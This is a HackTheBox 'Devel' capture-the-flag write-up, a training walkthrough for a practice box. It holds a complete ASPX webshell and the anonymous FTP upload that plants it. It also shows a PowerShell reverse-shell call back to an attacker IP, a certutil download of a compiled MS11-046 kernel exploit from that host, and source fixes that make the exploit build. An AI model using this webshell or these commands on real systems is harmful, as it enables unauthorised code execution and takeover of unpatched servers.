# HackTheBox — Devel

**Target IP:** 10.129.54.164
**Attacker IP:** 10.10.15.146

---

## 1. Reconnaissance

```
┌──(root㉿kali)-[/home/kali/devel]
└─# nmap -sCV -T4 -p21,80 10.129.54.164
Starting Nmap 7.98 ( https://nmap.org ) at 2026-08-04 12:55 +0000
Nmap scan report for 10.129.54.164
Host is up (0.31s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
| ftp-syst:
|_  SYST: Windows_NT
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: IIS7
|_http-server-header: Microsoft-IIS/7.5
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.10 seconds
```

Two things stand out immediately:

- **FTP (21)** allows **anonymous login**, and the listed directory contents (`aspnet_client`, `iisstart.htm`, `welcome.png`) match exactly what's served on port 80 — meaning the FTP root **is** the IIS webroot.
- **HTTP (80)** is IIS 7.5 / ASP.NET, so an uploaded `.aspx` file dropped via FTP should be directly executable via the web server.

---

## 2. Initial Foothold — FTP Upload → ASPX Webshell

### 2.1 Building the webshell

```aspx
<%@ Page Language="C#" Debug="true" Trace="false" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<script runat="server">
void Page_Load(object sender, EventArgs e) {
    string cmd = Request["cmd"];
    if (!string.IsNullOrEmpty(cmd)) {
        ProcessStartInfo psi = new ProcessStartInfo();
        psi.FileName = "cmd.exe";
        psi.Arguments = "/c " + cmd;
        psi.RedirectStandardOutput = true;
        psi.UseShellExecute = false;
        Process p = Process.Start(psi);
        StreamReader sr = p.StandardOutput;
        Response.Write("<pre>" + sr.ReadToEnd() + "</pre>");
    }
}
</script>
```

Saved locally as `shell.aspx`.

### 2.2 Uploading via anonymous FTP

```
ftp> put shell.aspx
local: shell.aspx remote: shell.aspx
229 Entering Extended Passive Mode (|||49180|)
125 Data connection already open; Transfer starting.
100% |*******************************************************************************************************|   661        3.07 MiB/s    --:-- ETA
226 Transfer complete.
661 bytes sent in 00:00 (1.58 KiB/s)
ftp> exit
```

### 2.3 Confirming code execution

```
┌──(root㉿kali)-[/home/kali/devel]
└─# curl "http://10.129.54.164/shell.aspx?cmd=whoami"
<pre>iis apppool\web
</pre>
```

Command execution confirmed as **`iis apppool\web`**.

```
┌──(root㉿kali)-[/home/kali/devel]
└─# curl "http://10.129.54.164/shell.aspx?cmd=dir"
<pre> Volume in drive C has no label.
 Volume Serial Number is 137F-3971

 Directory of c:\windows\system32\inetsrv

18/03/2017  02:06 §£    <DIR>          .
18/03/2017  02:06 §£    <DIR>          ..
14/07/2009  04:14 §£           155.648 appcmd.exe
.....
<snip — full IIS system32\inetsrv directory listing (~60 files: iis*.dll, w3wp.exe, ftpsvc.dll, InetMgr.exe etc.), all stock Windows/IIS binaries, nothing of interest>
.....
              61 File(s)      6.013.051 bytes
               4 Dir(s)   4.687.753.216 bytes free
</pre>
```

### 2.4 Upgrading to an interactive reverse shell

A base64/URL-encoded PowerShell TCP reverse shell one-liner was sent through the webshell's `cmd` parameter:

```
┌──(root㉿kali)-[/home/kali/devel]
└─# curl "http://10.129.54.164/shell.aspx?cmd=powershell%20-nop%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%2810.10.15.146%2C4444%29%3B..."
```

*(Full PowerShell reverse shell: connects back to `10.10.15.146:4444`, reads from the socket, pipes input to `iex`, and writes command output + a fake `PS <cwd>>` prompt back down the socket.)*

Caught the callback and confirmed an interactive-ish shell as `iis apppool\web`.

---

## 3. Privilege Escalation — Local Kernel Exploit (MS11-046)

### 3.1 Fingerprinting the OS

```
PS C:\windows\system32\inetsrv> systeminfo

Host Name:                 DEVEL
OS Name:                   Microsoft Windows 7 Enterprise
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          babis
Registered Organization:
Product ID:                55041-051-0948536-86302
Original Install Date:     17/3/2017, 4:17:31 ??
System Boot Time:          4/8/2026, 3:51:49 ??
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2445 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/11/2020
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     3.071 MB
Available Physical Memory: 2.451 MB
Virtual Memory: Max Size:  6.141 MB
Virtual Memory: Available: 5.512 MB
Virtual Memory: In Use:    629 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection 4
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.10.10.2
                                 IP address(es)
                                 [01]: 10.129.54.164
                                 [02]: fe80::9c66:d09c:f3b5:ba37
                                 [03]: dead:beef::9cae:97d7:88a6:4c
                                 [04]: dead:beef::9c66:d09c:f3b5:ba37
```

**Windows 7 Enterprise, build 7600 — no hotfixes installed** (`Hotfix(s): N/A`). A completely unpatched box, and a strong signal for a local kernel exploit.

### 3.2 Selecting the exploit

Found a matching privilege-escalation exploit for this version on exploit-db: **[exploit-db.com/exploits/40564](https://www.exploit-db.com/exploits/40564)** — **MS11-046** (Windows kernel `afd.sys` local privilege escalation).

### 3.3 Fixing the compile

Initial compile failed due to an outdated function signature for `ZwQuerySystemInformation` in current mingw headers:

```
┌──(root㉿kali)-[/home/kali/devel]
└─# i686-w64-mingw32-gcc MS11-046.c -o MS11-046.exe
MS11-046.c: In function ‘main’:
MS11-046.c:488:5: error: too many arguments to function ‘ZwQuerySystemInformation’; expected 0, have 4
  488 |     ZwQuerySystemInformation(11, (PVOID) &systemInformation, 0, &systemInformation);
      |     ^~~~~~~~~~~~~~~~~~~~~~~~ ~~
MS11-046.c:502:5: error: too many arguments to function ‘ZwQuerySystemInformation’; expected 0, have 4
  502 |     ZwQuerySystemInformation(11, systemInformationBuffer, systemInformation * sizeof(*systemInformationBuffer), NULL);
      |     ^~~~~~~~~~~~~~~~~~~~~~~~ ~~
```

**Fix:** the exploit source relied on `ZwQuerySystemInformation` being resolved as a zero-arg `FARPROC`, which no longer matches. Patched the source to properly declare and cast a function pointer typedef:

Added:
```c
typedef LONG NTSTATUS;

typedef NTSTATUS (WINAPI *PZWQUERYSYSTEMINFORMATION)(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);
```

Removed:
```c
FARPROC ZwQuerySystemInformation;
ZwQuerySystemInformation = GetProcAddress(GetModuleHandle("ntdll.dll"), "ZwQuerySystemInformation");
```

Replaced with:
```c
PZWQUERYSYSTEMINFORMATION ZwQuerySystemInformation;

ZwQuerySystemInformation =
    (PZWQUERYSYSTEMINFORMATION)GetProcAddress(
        GetModuleHandleA("ntdll.dll"),
        "ZwQuerySystemInformation");
```

Recompiled, this time linking Winsock:

```
┌──(root㉿kali)-[/home/kali/devel]
└─# i686-w64-mingw32-gcc MS11-046.c -o MS11-046.exe -lws2_32
```

Compiled cleanly.

### 3.4 Delivering the exploit

Served the compiled binary over a local HTTP server:

```
┌──(root㉿kali)-[/home/kali/devel]
└─# python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
10.129.54.187 - - [04/Aug/2026 15:10:31] "GET /MS11-046.exe HTTP/1.1" 200 -
```

Pulled it down on the target via `certutil`:

```
C:\ProgramData>certutil.exe -urlcache -split -f http://10.10.15.146:8080/MS11-046.exe MS11-046.exe
certutil.exe -urlcache -split -f http://10.10.15.146:8080/MS11-046.exe MS11-046.exe
****  Online  ****
  000000  ...
  03e31d
CertUtil: -URLCache command completed successfully.
```

### 3.5 Root (SYSTEM)

```
C:\ProgramData>MS11-046.exe
MS11-046.exe

c:\Windows\System32>whoami
whoami
nt authority\system
```

**`nt authority\system`** — full privilege escalation achieved.

---

## 4. Flags

```
c:\Windows\System32>cd C:\Users
C:\Users>dir
 Directory of C:\Users
18/03/2017  02:16       <DIR>          .
18/03/2017  02:16       <DIR>          ..
18/03/2017  02:16       <DIR>          Administrator
17/03/2017  05:17       <DIR>          babis
18/03/2017  02:06       <DIR>          Classic .NET AppPool
14/07/2009  10:20       <DIR>          Public

C:\Users>cd babis\Desktop
C:\Users\babis\Desktop>dir
 Directory of C:\Users\babis\Desktop
11/02/2022  04:54       <DIR>          .
11/02/2022  04:54       <DIR>          ..
04/08/2026  05:35                   34 user.txt
C:\Users\babis\Desktop>type user.txt

C:\Users>cd Administrator\Desktop
C:\Users\Administrator\Desktop>dir
 Directory of C:\Users\Administrator\Desktop
14/01/2021  12:42       <DIR>          .
14/01/2021  12:42       <DIR>          ..
04/08/2026  05:35                   34 root.txt
C:\Users\Administrator\Desktop>type root.txt
```

Both `user.txt` (in `babis`'s Desktop) and `root.txt` (in `Administrator`'s Desktop) were retrieved — 34-byte flag files, contents omitted here.

---

## 5. Summary

| Stage | Vector |
|---|---|
| Recon | nmap: anonymous FTP + IIS 7.5, FTP root = web root |
| Initial access | Uploaded `.aspx` webshell via anonymous FTP, triggered over HTTP → RCE as `iis apppool\web` |
| Shell upgrade | PowerShell TCP reverse shell via webshell `cmd` param |
| Privilege escalation | Unpatched Windows 7 (no hotfixes) → **MS11-046** kernel exploit, patched to compile against modern mingw headers → `nt authority\system` |
| Impact | Full SYSTEM compromise, both flags retrieved |

### Key takeaways
- **Anonymous FTP write access sharing the same root as the web server** is a critical misconfiguration — any anonymous user can upload and instantly execute server-side code.
- IIS + ASP.NET webshells are trivial once file upload + execution paths align this cleanly; no auth bypass or injection needed.
- A `Hotfix(s): N/A` line in `systeminfo` is a big red flag on an old Windows box — it strongly suggests known, unpatched local kernel exploits (like MS11-046) will work.
- Public PoC exploits often need small adjustments to compile against modern toolchains (e.g., stale Win32 API signatures) — always inspect and patch instead of assuming a PoC is broken/unusable.
